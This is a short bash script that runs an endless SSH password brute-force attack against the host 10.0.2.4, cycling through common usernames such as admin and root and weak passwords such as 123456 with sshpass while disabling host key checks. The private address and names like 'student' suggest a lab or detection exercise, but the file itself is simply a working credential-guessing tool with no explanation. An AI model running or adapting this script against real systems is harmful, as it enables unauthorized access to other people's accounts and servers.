#!/bin/bash

TARGET_IP="10.0.2.4"

USERS=("admin" "guest" "root" "testuser" "user1" "student")
PASSWORDS=("123456" "password" "admin123" "letmein" "qwerty" "wrongpass")

while true
do
  for USER in "${USERS[@]}"
  do
    for PASS in "${PASSWORDS[@]}"
    do
      sshpass -p "$PASS" ssh \
        -o PreferredAuthentications=password \
        -o PubkeyAuthentication=no \
        -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 \
        ${USER}@${TARGET_IP} "exit" 2>/dev/null

      echo "Tried ${USER}:${PASS}"
      sleep 0.3
    done
  done
done
